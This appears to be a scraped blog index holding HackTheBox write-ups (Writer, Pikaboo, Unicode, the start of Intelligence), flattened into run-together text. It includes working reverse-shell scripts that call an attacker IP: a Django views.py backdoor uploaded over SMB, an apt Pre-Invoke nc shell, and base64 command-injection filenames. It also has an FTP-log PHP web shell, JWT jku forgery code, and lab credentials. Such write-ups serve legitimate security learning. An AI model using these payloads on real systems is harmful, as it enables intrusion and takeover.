applicationapplication.secret_key = os.environ.get(&quot;SECRET_KEY&quot;, &quot;&quot;)__init__.py file found in web root directory in app folder writer: /var/www/writer.htb/writer/__init__.py Command injection in __init__.py Unintended PathRCE using SSRF with smbFound database creds from __init__.py: admin:ToughPasswordToCrack Revise in the beginning, we found a smb share: //10.10.11.101/writer2_project we have a user: kyle and a password ToughPasswordToCrack which worked with user kyle on smb share: kyle:ToughPasswordToCrack And a local dev server: 127.0.0.1:8080 Plus “writer2_project” share has local dev application source code. User “kyle” has read/write access in the share. source code we got from smb share, dev application “writer_web” only has 1 function “home_page” calling from “views.py” which loads “index.html”if we append reverse shell in views.py it could give us shell.And request http://127.0.0.1:8080/#.jpg with ssrf we found in /dashboard/stories/addPython script to automate the process#! /usr/bin/python3import requests as rfrom smb.SMBConnection import SMBConnection#create temp file with shell contentdef create_file(): f = open(&quot;/tmp/views.py&quot;, &quot;w&quot;) lhost = &quot;10.10.14.44&quot; lport = 4141 views_py = f&quot;&quot;&quot;from django.shortcuts import renderfrom django.views.generic import TemplateViewimport osdef home_page(request): os.system(&#39;/bin/bash -c &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/{lhost}/{lport} 0&amp;gt;&amp;amp;1&quot;&#39;) template_name = &quot;index.html&quot; return render(request,template_name)&quot;&quot;&quot; f.write(views_py) f.close()#upload/replace to smb sharedef smb_put(): conn = SMBConnection(&#39;kyle&#39;, &#39;ToughPasswordToCrack&#39;, &#39;test_v1&#39;, &#39;v1&#39;, use_ntlm_v2=True) assert conn.connect(&#39;10.10.11.101&#39;, 139) with open(&#39;/tmp/views.py&#39;, &#39;rb&#39;) as file_obj: conn.storeFile(&#39;writer2_project&#39;, &#39;/writer_web/views.py&#39;, file_obj) file_obj.close()#invoke dev app on localhost with ssrfdef ssrf(): s = r.session() url = &#39;http://10.10.11.101&#39; s.post(f&quot;{url}/administrative&quot;, data=&quot;uname=test&#39;+OR+1=1;--+-&amp;amp;password=test&quot;, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}) header = {&quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------40554192439809207943475147343&quot;} data = &quot;&quot;&quot;-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;author&quot;\\r\\n\\r\\ntest\\r\\n-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;title&quot;\\r\\n\\r\\ntest\\r\\n-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;tagline&quot;\\r\\n\\r\\ntestAnd\\r\\n-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;image&quot;; filename=&quot;&quot;\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\\r\\n-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;image_url&quot;\\r\\n\\r\\nhttp://127.0.0.1:8080/#.jpg\\r\\n-----------------------------40554192439809207943475147343\\r\\nContent-Disposition: form-data; name=&quot;content&quot;\\r\\n\\r\\ntest\\r\\n-----------------------------40554192439809207943475147343--\\r\\n&quot;&quot;&quot; s.post(f&quot;{url}/dashboard/stories/add&quot;, headers=header, data=data) s.close()create_file()smb_put()ssrf()PrivescThere are multiple users on the box╔══════════╣ Users with consolefilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/shjohn:x:1001:1001:,,,:/home/john:/bin/bashkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bashroot:x:0:0:root:/root:/bin/bashdev app processwww-data 926 0.0 0.0 2608 604 ? Ss Dec13 0:00 | _ /bin/sh -c cd /var/www/writer2_project &amp;amp;&amp;amp; python3 manage.py runserver 127.0.0.1:8080www-data 930 0.0 0.9 52668 39224 ? S Dec13 0:01 | _ python3 manage.py runserver 127.0.0.1:8080www-data 54123 1.6 1.0 128976 43068 ? Sl 04:30 0:01 | _ /usr/bin/python3 manage.py runserver 127.0.0.1:8080Active ports on local hosttcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN 54123/python3 tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -dev webapp is running django framework and we can use it to access database.Got password hash for user “kyle” and cracked with hashcat❯ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt --showpbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio System user kyle creds: kyle:marcoantonioUser “kyle” is in 2 other groups besides defaultskyle@writer:~$ iduid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)These groups owned some files(remote) www-data@writer:/$ find / -group filter 2&amp;gt;/dev/null/etc/postfix/disclaimer/var/spool/filter(remote) www-data@writer:/$ find / -group smbgroup 2&amp;gt;/dev/null/var/www/writer2_projectwe already explore “writer2_project” and /var/spool/filter is a empty directory and /etc/postfix/disclaimer is a bash script with full read/write/execute permission.postfix automate scripts/etc/postfix/disclaimer script looks like a post processing script for received emails.And in Postfix these type of script executes from /etc/postfix/master.cf config file.And we can check that /etc/postfix/disclaimer script is specified in the config file.(remote) www-data@writer:/$ cat /etc/postfix/master.cf | tail -n 2dfilt unix - n n - - pipe flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}This script is executing from user “john” when server received a email.And if we fingerprint port 25, that port is running postfix server(remote) www-data@writer:/$ nc 127.0.0.1 25220 writer.htb ESMTP Postfix (Ubuntu)So, we have everything, postfix server and script that execute by user “john” and writable by user “kyle”.If we add reverse shell in the /etc/postfix/disclaimer script and send a email to local server postfix execute that script with as well as our command as user “john”To test the theory, i tried with a simple command and added it in the start of the script.echo kwakkwak &amp;gt; /tmp/poorduck.txtthen connect to the postfix server using nc and send a email to system user.nc 127.0.0.1 25MAIL FROM:brrrr@writer.htbRCPT TO:john@writer.htbDATAFrom: brrrr@writer.htbTo: john@writer.htbSubject: TestTesting.And our specified file is created with echo command.Got user “john” shell by adding ssh keyInvoke command with apt ConfigsUser “john” is in a group besides defaultsThat means user “john” can write inside /etc/apt/apt.conf.d directoryAll of the files in /etc/apt/apt.conf.d/ are instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.There are 2 invoke options in apt Pre-Invoke and Post-Invoke that allows to run commands before and after the apt command execute.add any of the line based on the condition in apt config file.APT::Update::Pre-Invoke {&quot;COMMAND&quot;;};APT::Update::Post-Invoke {&quot;COMMAND&quot;;};But apt only execute root/sudo and thats why there is a cronjob is running that executes /usr/bin/apt-get update command in every few minutes, i found this by monitoring processes with pspy2021/12/14 10:56:03 CMD: UID=0 PID=14803 | /usr/bin/apt-get updateSo only thing we need to do is to create a config file inside /etc/apt/apt.conf.d directory and wait for apt to get execute.echo &#39;apt::Update::Pre-Invoke {&quot;rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.44 4141 &amp;gt;/tmp/f&quot;};&#39; &amp;gt; /etc/apt/apt.conf.d/000-shellUnintended FootholdCommand Injection via filenameThere are 2 path in the main webapp /dashboard/stories/add and /dashboard/stories/edit/&amp;lt;id&amp;gt; which has image upload functionality.If image sourced from a url then it uses urllib.request.urlretrieve to retrieve it and save that image. After get admin dashboard using sqli authentication bypass we can access to /dashboard/stories/add# ... [snip] ...local_filename, headers = urllib.request.urlretrieve(image_url)os.system(&quot;mv {} {}.jpg&quot;.format(local_filename, local_filename))# ... [snip] ...With normal http protocol this function save loaded file from specified url as a tmp name&amp;gt;&amp;gt;&amp;gt; import urllib.request&amp;gt;&amp;gt;&amp;gt; local_filename, headers = urllib.request.urlretrieve(&#39;http://127.0.0.1:8000/test.jpg&#39;)&amp;gt;&amp;gt;&amp;gt; print(local_filename)/tmp/tmplzvbozxtAnd thats why there is mv command appending .jgp in the filename.But if we use file:// protocol, filename stayed as it is. This is because urlretrieve() function doing nothing nothing with file://.&amp;gt;&amp;gt;&amp;gt; local_filename, headers = urllib.request.urlretrieve(&#39;file:///tmp/test.jpg&#39;)&amp;gt;&amp;gt;&amp;gt; print(local_filename)/tmp/test.jpgAnd there is no filter for this in the application and the fact that the application directly sends the filename into os.system function which invokes system commands is bad.Here we can inject command with filename using file:// protocol and get command execution.Testimport urllib.request, oslocal_filename, headers = urllib.request.urlretrieve(&#39;file:///tmp/;whoami;&#39;)os.system(&quot;mv {} {}.jpg&quot;.format(local_filename, local_filename))but file:// protocol only work in local filesystem. To achieve command execution with this bug first we need to upload a image with system command in it’s name.The fact that the image upload is just checking for .jpg anywhere in the filename.# ... [snip] ...if &quot;.jpg&quot; in image.filename:# ... [snip] ...something like &#39;kwakkwak.jpg;COMMAND;&#39; easily work here.❯ echo &#39;ping -c 2 10.10.14.44 &#39; | base64cGluZyAtYyAyIDEwLjEwLjE0LjQ0ICAK❯ touch &#39;kwakkwak.jpg;echo cGluZyAtYyAyIDEwLjEwLjE0LjQ0ICAK|base64 -d|bash;&#39;upload that file using file upload and then once again edit/create post and this time load that uploaded file from file system with file:// protocol.file:///var/www/writer.htb/writer/static/img/kwakkwak.jpg;echo cGluZyAtYyAyIDEwLjEwLjE0LjQ0ICAK|base64 -d|bash; Uploaded images are stored in /var/www/writer.htb/writer/static/img/ And keep in mind that there is a client side filter." }, { "title": "Hackthebox - Pikaboo", "url": "/posts/pikaboo/", "categories": "hackthebox, linux", "tags": "nginx, url parser logic, lfi, perl command injection", "date": "2021-12-10 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.249 pikaboo.htbnmap scan:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)| 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)|_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: PikabooService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelweb server home page have /adminFootholdFrom web server’s DIRECTORY TRAVERSAL to LFI to RCE.URL parser logic(directory traversal) in nginx/admin uses http basic authentication but the error looks intrestingnginx server is running reverse proxy to local apache server. A good blog on Nginx misconfigurations issues: https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/There is a url parser logic bug in misconfigured nignx config file. This bug also covered in the Hackthebox: sealOrange Tsai presentation https://www.youtube.com/watch?v=CIhHpkybYsY https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdfgobuster found something interesting❯ gobuster dir -u http://10.10.10.249/admin../ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100# ... [snip] .../admin (Status: 401) [Size: 456]/javascript (Status: 301) [Size: 314] [--&amp;gt; http://127.0.0.1:81/javascript/]/server-status (Status: 200) [Size: 4339]/javascript return 403 Forbiddenwe have access to /server-status, this will give us some interesting insight informationFound a new directory form /server-status/admin_stagingThere are some pages in this directory and application loading them from a parameterhttp://10.10.10.249/admin../admin_staging/index.php?page=user.phplfiThis parameter could lead to lfi vulnerability.on first glance it looks like that there is no lfi vulnerability but running multiple lfi fuzzing list from seclists only get these 4 filesLooks file application can’t escape /var directory.lfi to RCE via ftp logone file that could help us to get reverse shell is /var/log/vsftpd.logFrom nmap scan, ftp service is listening on port 21FTP server logs are stored in /var/log/vsftpd.log. If you have a LFI and can access a exposed vsftpd server, you could try to login setting the PHP payload in the username and then access the logs using the LFI.use php code as username&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;add php web shell in ftp log file and execute it with lfi.&#39;&amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt;&#39;request parameter c and send url encoded bash reverse shell with it.Python script to automate the exploitimport ftplibimport requests as rlhost = &#39;10.10.14.42&#39; #changemelport = &#39;4141&#39; #changeme# payload = &quot;&quot;&quot;&#39;&amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt;&#39;&quot;&quot;&quot;payload = f&quot;&quot;&quot;&#39;&amp;lt;?php exec(&quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{lhost}/{lport} 0&amp;gt;&amp;amp;1&#39;&quot;); ?&amp;gt;&#39;&quot;&quot;&quot;server = ftplib.FTP()try: server.connect(&#39;10.10.10.249&#39;, 21) server.login(payload, &#39;&#39;)except ftplib.all_errors as e: print(e)except KeyboardInterrupt as e: exit(&#39;KeyboardInterrupt&#39;)lfi_url = f&#39;http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log&#39;try: rspn = r.get(lfi_url, timeout=10) # print(rspn.text)except r.exceptions.Timeout: exit(&#39;Request timeout&#39;)except r.exceptions.RequestException as e: exit(e)except KeyboardInterrupt: exit(&#39;KeyboardInterrupt&#39;)PrivescFrom linpeas script, found some interesting informationThere is a crontab running every minute* * * * * root /usr/local/bin/csvupdate_cronldap database server running in localhostState Recv-Q Send-Q Local Address:Port Peer Address:PortLISTEN 0 128 127.0.0.1:389 0.0.0.0:*And ldap server password from PokeAPI config /opt/pokeapi/config/setting.py&quot;ldap&quot;: { &quot;ENGINE&quot;: &quot;ldapdb.backends.ldap&quot;, &quot;NAME&quot;: &quot;ldap:///&quot;, &quot;USER&quot;: &quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot;, &quot;PASSWORD&quot;: &quot;J~42%W?PFHl]g&quot;, },perl command injectionCrontab is running a bash script which executing /usr/local/bin/csvupdate in ftp directory every minute as rootAnd /usr/local/bin/csvupdate is a perl script.(remote) www-data@pikaboo.htb:/var/www$ file /usr/local/bin/csvupdate/usr/local/bin/csvupdate: Perl script text executableScript banner say that this script is part of the PokeAPI and taking .csv files from ftp home directory.This script is using open() function to read files from ftp directory# ... [snip] ...my $fname = &quot;${csv_dir}/${type}.csv&quot;;open(my $fh, &quot;&amp;gt;&amp;gt;&quot;, $fname) or die &quot;Unable to open CSV target file.\\n&quot;;# ... [snip] ...And there is a command injection bug in the perl’s open() function From this research paper: https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf Talk “Netanel Rubin: The Perl Jam 2”: https://www.youtube.com/watch?v=RPvORV2Amic Even if you do not intend to execute a command line in a shell it can happen as a side effect of using what looks like an innocuous library. For example, consider the Perl open function: open(F, $filename) Depending on the syntax of the string ​$filename​ this can open files in various modes, start programs, run commands, or duplicate file descriptors. For example, if ​$filename​ is “​rm -rf /|​”, it will execute the rm command in a shell and delete the file system root (if privileges allow). So, if we use a command as filename and save it in the ftp directory, That /usr/local/bin/csvupdate script could execute that command.Second Thing is that, if we need ftp creds for accessing the server so do the PokeAPI and it’s config file only contains ldap database creds.We know the ldap creds from /opt/pokeapi/config/setting.pyGot commnad for extract data from hacktricksldapsearch -x -h &amp;lt;IP&amp;gt; -D &#39;&amp;lt;DOMAIN&amp;gt;\\&amp;lt;username&amp;gt;&#39; -w &#39;&amp;lt;password&amp;gt;&#39; -b &quot;DC=&amp;lt;1_SUBDOMAIN&amp;gt;,DC=&amp;lt;TDL&amp;gt;&quot;Get data from ftp domainldapsearch -x -h 127.0.0.1 -D &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc=ftp,dc=pikaboo,dc=htb&#39;ftp user creds: pwnmeow:_G0tT4_C4tcH_&#39;3m_4lL!_Create a file with reverse shell as it’s name in the local direcotry.❯ echo &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.44/4141 0&amp;gt;&amp;amp;1 &#39; | base64 -w 0YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC40NC80MTQxICAwPiYxICAK❯ touch -- &#39;|echo YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC40NC80MTQxICAwPiYxICAK|base64 -d|bash;.csv&#39;❯ ls&#39;|echo YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC40NC80MTQxICAwPiYxICAK|base64 -d|bash;.csv&#39;Use mput * to upload file. User “pwnmeow” don’t have permission to write in ftp root directory but there are bunch of sub directory where we can write.after uploading file run netcat listener." }, { "title": "Hackthebox - Unicode", "url": "/posts/unicode/", "categories": "hackthebox, linux", "tags": "jwt, jwt jku bypass, lfi, python byte-codes decompile, command injection", "date": "2021-12-01 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.126 hackmedia.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)| 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)|_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: E06EE2ACCCCCD12A0FD09983B44FE9D9|_http-generator: Hugo 0.83.1| http-methods: |_ Supported Methods: GET OPTIONS HEAD|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: HackmediaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelweb app hava login and register option and /redirect looks like a open redirect on not useful right now.❯ echo http://$ip | hakrawlerhttp://10.10.11.126/http://10.10.11.126/login/http://10.10.11.126/register/http://10.10.11.126/redirect/?url=google.comregister with new account and logged,One thing to be noted that, it is possible to enumerate exist users with some scripting/burp-intruder because application gives explicit error message if user already exists.There are some functionalities but looks like none of them really works, only one thing looks interesting is the cookie which contains a auth token.FootholdJWT jku bypasslooks like a jwt tokenToken contains jku value: jku = &quot;http://hackmedia.htb/static/jwks.json&quot; Got a hostname: hackmedia.htb jku stands for JWK Set URL. jku Header points to a URL containing the JWKS file that holds the Public Key for verifying the token. There is a way to bypass token verification from jku header: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jkuFor the, we need to create a public-private key and a jwks file hosted on our server.First you need to create a new certificate with new private &amp;amp; public keys -openssl genrsa -out keypair.pem 2048openssl rsa -in keypair.pem -pubout -out publickey.crtopenssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.keyThen to create the new JWT with the created publickey.crt(public) and pkcs8.key(private) keys and pointing the parameter jku to the certificate created.HEADER{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;jku&quot;:&quot;http://attacker.server/jwks.json&quot;}PAYLOAD{&quot;user&quot;:&quot;admin&quot;}In order to create a valid jku certificate you can download the original one and change the needed parameters.wget http://hackmedia.htb/static/jwks.jsonYou can obtain the parameter “e” and “n” from a public certificate using python - There is a issue with formatting hacktricks shows this value in hex format but our target server using possibly base64 format. We can still get these values with python but with different module and different techniques. from jwcrypto import jwkimport jsonwith open(&quot;keypair.pem&quot;, &quot;rb&quot;) as pemfile: key = jwk.JWK.from_pem(pemfile.read())jwks = key.export_public()print(json.loads(jwks)[&#39;n&#39;])print(json.loads(jwks)[&#39;e&#39;]) Replace e and n value in original jwks.json with new values.{ &quot;keys&quot;: [ { &quot;kty&quot;: &quot;RSA&quot;, &quot;use&quot;: &quot;sig&quot;, &quot;kid&quot;: &quot;hackthebox&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;n&quot;: &quot;5VB6YkmCCvY7UTdKNh4jUSxySy8Kew9A_ZIb3zilwMzXOgg8gThoicyR9pQmpjKrNWYz3eBueDkkjc7gHaN7H97rbpZq01NxsKGxWGqgO7JVSjq0o_YLPBztGFZ-R0tqZ-wzObuL8ZDnbm0vWdgFtxSVNAGB8eL0S-t9wMY6ALz8KXbYyWarH1FJpgYFtzrYRE6oJQsPCfgCzWIkKEV-dUyAcn7B2sVKjceEsI1JoKonQU4X6RJmU8PHFcjFqix2_fWUhVhLjVcKDHDNECY-h3jfd-1j_m0Na1F5eP87s_hSLdJVkaIiI4v6lOpFR7BxbN-UN9aCo_PE8thW3TavSw&quot;, &quot;e&quot;: &quot;AQAB&quot; } ]}Now, Host that jwks.json file on http server And GET request to /dashboard with modified auth token but got validation error: jku validation failed.That means there are some filters and black/white list that preventing this.Found this on google which remind me something: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/jwt-forgery-via-chaining-jku-parameter-with-open-redirect-/At the beginning i notice a open redirect from http://10.10.11.126/redirect/?url=google.com. We can use it and try to bypass that filter.After some testing i found out possible filters. Application explicitly checks for http://hackmedia.htb/static/ Does not support any other port besides port 80.Possible way to bypass. use ../ after static/ to go back to /redirect run http server with port 80Final jwt token payload and header looks like this; Get new token with these values.{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;jku&quot;:&quot;http://hackmedia.htb/static/../redirect/?url=10.10.14.24/jwks.json&quot;}{&quot;user&quot;:&quot;admin&quot;}And finally got the admin panellfiThere are only two working link on the admin dashboard. Both has same directory and parameter only value is differenthttp://hackmedia.htb/display/?page=monthly.pdfhttp://hackmedia.htb/display/?page=quarterly.pdfbased on the parameter values, this could be a lfi bug.Tried some ../../ and immediately redirect to /filenotfound with a message: “we do a lot input filtering you can never bypass our filters.Have a good day”That means this is a lfi but there are some filters we need to bypass. Good resourse on WAF bypass: https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.htmlAnd based on the box name, successfully bypass WAF with unicode character ︰ which Normalization as ..sake of the learning purpose, i tried to create a python script to automate all of this.import jwtimport jsonfrom Crypto.PublicKey import RSAimport requests as rfrom jwcrypto import jwkimport argparseimport reimport netifaces as ni# from os import getcwdhost = &#39;http://hackmedia.htb&#39; # **IMPORTANT** add &quot;10.10.11.126 hackmedia.htb&quot; in &quot;/etc/hosts&quot; file.files_path = &#39;.&#39; # getcwd()ip = ni.ifaddresses(&#39;tun0&#39;)[ni.AF_INET][0][&#39;addr&#39;]jwks_serv_ip = ipclass GenTokenAndJWKS: def __init__(self): # Generate RSA key key = RSA.generate(2048) private_key = key.exportKey(&#39;PEM&#39;) public_key = key.publickey().exportKey(&#39;PEM&#39;) # Extract &quot;n&quot; and &quot;e&quot; value key = jwk.JWK.from_pem(public_key) jwks = key.export_public() # print(json.loads(jwks)) # Generate modified &quot;jwks.json&quot; file org_jwks = r.get(f&#39;{host}/static/jwks.json&#39;).text # print(org_jwks) json_object = json.loads(org_jwks) json_object[&#39;keys&#39;][0][&#39;n&#39;] = json.loads(jwks)[&#39;n&#39;] json_object[&#39;keys&#39;][0][&#39;e&#39;] = json.loads(jwks)[&#39;e&#39;] # print(json.dumps(json_object, indent=4)) self.modified_jwks = json_object # Using Open redirect to bypass jku validation jwks_server = f&quot;{host}/static/../redirect/?url={jwks_serv_ip}/jwks.json&quot; # Generate jwt token self.jwt_token = jwt.encode({&quot;user&quot;: &quot;admin&quot;}, private_key, algorithm=&quot;RS256&quot;, headers={&quot;jku&quot;: jwks_server}) # print(self.jwt_token) # decoded = jwt.decode(jwt_token, public_key, algorithms=[&quot;RS256&quot;]) # print(decoded)parser = argparse.ArgumentParser()parser.add_argument(&#39;--genFiles&#39;, action=&#39;store_true&#39;, help=&quot;Generate jwks.json and token.&quot;)parser.add_argument(&#39;--lfi&#39;, help=&quot;lfi attack.&quot;)args = parser.parse_args()def getValues(): return GenTokenAndJWKS()def GenRequiredFiles(): values = getValues() # write modified jwks in &quot;jwks.json&quot; print(f&quot;[+] &#39;jwks.json&#39; and &#39;jwt.token&#39; will be saved in[CWD]: {files_path}&quot;) a_file = open(f&quot;{files_path}/jwks.json&quot;, &quot;w&quot;) json.dump(values.modified_jwks, a_file, indent=4) a_file.close() # Write jwt token in a file a_file = open(f&quot;{files_path}/jwk.token&quot;, &quot;w&quot;) a_file.write(values.jwt_token) a_file.close()if args.genFiles: GenRequiredFiles()try: jwt_token = open(f&quot;{files_path}/jwk.token&quot;, &quot;r&quot;).read() cookies_dict = {&quot;auth&quot;: jwt_token} if args.genFiles: # Test token input(f&quot;[+] Run &#39;sudo python3 -m http.server 80&#39; on CWD before continue[ENTER]...&quot;) rspn = r.get(f&quot;{host}/dashboard/&quot;, cookies=cookies_dict, allow_redirects=False) print(f&quot;[!] Token take us to: {re.findall(r&#39;&amp;lt;title&amp;gt;(.*?)&amp;lt;/title&amp;gt;&#39;, rspn.text)[0]}&quot;)except FileNotFoundError as e: print(e)def lfi(payload): lfi_rspn = r.get(f&quot;{host}/display/?page={payload}&quot;, cookies=cookies_dict) if &#39;Unauthorized&#39; in lfi_rspn.text: exit(&#39;Unauthorized&#39;) elif re.search(r&#39;&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39;, lfi_rspn.text): print(f&quot;[-] {re.findall(r&#39;&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39;, lfi_rspn.text)[0]}!&quot;) elif re.search(r&#39;&amp;lt;title&amp;gt;(.*?)&amp;lt;/title&amp;gt;&#39;, lfi_rspn.text): print(re.findall(r&#39;&amp;lt;title&amp;gt;(.*?)&amp;lt;/title&amp;gt;&#39;, lfi_rspn.text)[0]) else: print(lfi_rspn.text)if args.lfi: path = f&quot;︰/︰/︰/︰/︰/︰{args.lfi}&quot; lfi(path)burp issuewhile sending request with unicode characters burp automatically convert these character before forwarding and breaks the bypass.from level of my knowledge, Burp only takes every character as single byte character.Hex value of ︰ » ef b8 b0 which represent of three unicode characters - Hex unicode char ef ï b8 ¸ b0 ° And combinations of these three characters create a unicode character vertical two dot leader ︰and when we past ︰ it converted to 0.to solve this we need to load all character separately ï¸° which normalize to ︰to make it easy we can encode ︰ in base64 and after pasting in burp decode base64.❯ echo -n &#39;︰&#39; | base6477iwfrom nginx config file found about db.yamlAnd, From db.yaml got user creds. Worked for user code ssh login. PrivescUser “code” allowed to run /usr/bin/treport as root with no password.code@code:~$ sudo -lMatching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser code may run the following commands on code: (root) NOPASSWD: /usr/bin/treportAfter some testing, Found out This is a python script and possible created with pyinstaller There are 4 options it in program First 2 options don’t return anything interesting. option 3 fetching urls and it’s using curl And special characters are not allowed Python byte-codes decompileThere is a script which we can use to extract python byte-codes: pyinstxtractor.So, There is a well-known tool for decompiling python3 byte-codes python-decompile3 but there are some issues going on on this project.but there is a another tool not fully stable but it worked: pycdc.Setup pycdc and build executablegit clone https://github.com/zrax/pycdc &amp;amp;&amp;amp; cd pycdccmake .cmake --build .Then use pycdc to extract source from treport.pyc file❯ ./pycdc treport.pyc &amp;gt; treport.pyUnsupported opcode: &amp;lt;255&amp;gt;Unsupported opcode: &amp;lt;255&amp;gt;Unsupported opcode: &amp;lt;255&amp;gt;Only information get form python source is that there is a command injection in option 3 and most of the special character are blacklisted.Command injectionThere are so many useful character are blacklisted but not all. blacklisted: $`;&amp;amp;|||&amp;gt;&amp;lt;?&#39;@#$%^() allowed: *[]-&quot;{}\\:,./+=!~And there is a flag -K which allow user to load config fileand there is a bash trick to execute a command with its argument without space using {} and argument separated with ,❯ bash -c &#39;{uname,-s}&#39;Linuxit is possible to read files from stderr of curl with -K but this messed-up the file.{-K,/root/.ssh/id_rsa}There is a one comparison in the python source that blacklisting some protocolsif &#39;file&#39; in ip and &#39;gopher&#39; in ip or &#39;mysql&#39; in ip:print(&#39;INVALID URL&#39;)But this is case sensitive and eassliy bypass capital character like File, Gopher, Mysql without affecting the behaviour in curl command.code@code:~$ curl File:///etc/hostnamecodebut there is one more error, in the source code curl command outputting in the /root/reports/ directorycmd = &#39;/bin/bash -c &quot;curl &#39; + ip + &#39; -o /root/reports/threat_report_&#39; + current_time + &#39;&quot;&#39;but it looks like that direcotry in not presented there.To bypass this with file protocol, we can combine it with our first bypass technique and use with --create-dirs flag which, When used in conjunction with the -o, --output option, curl will create the necessary local directory hierarchy as needed.{File:///root/.ssh/id_rsa,--create-dirs}Don’t know why but this key isn’t working for me." }, { "title": "Hackthebox - Intelligence", "url": "/posts/intelligence/", "categories": "hackthebox, windows", "tags": "name based fuzing, bloodHound, silver ticket attack, reading gmsa password, ntlm relay attack", "date": "2021-11-26 18:30:00 +0000", "snippet": "EnumerationIP-ADDR: 10.10.10.248 intelligence.htbnmap scan:PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Intelligence88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-19 21:02:42Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-19T21:04:18+00:00; +7h03m54s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP 